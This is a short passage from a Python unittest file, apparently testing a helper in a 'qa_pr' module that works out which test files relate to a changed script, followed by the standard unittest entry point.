            r = qa_pr.Pr.relacionados(wt, ["scripts/modulo_x.py"], "tests/test_otro.py sigue pasando; tests/test_ya.py", {"tests/test_ya.py"})
            self.assertEqual(r, ["tests/test_modulo_x.py", "tests/test_otro.py"])


if __name__ == "__main__":
    unittest.main(verbosity=1)
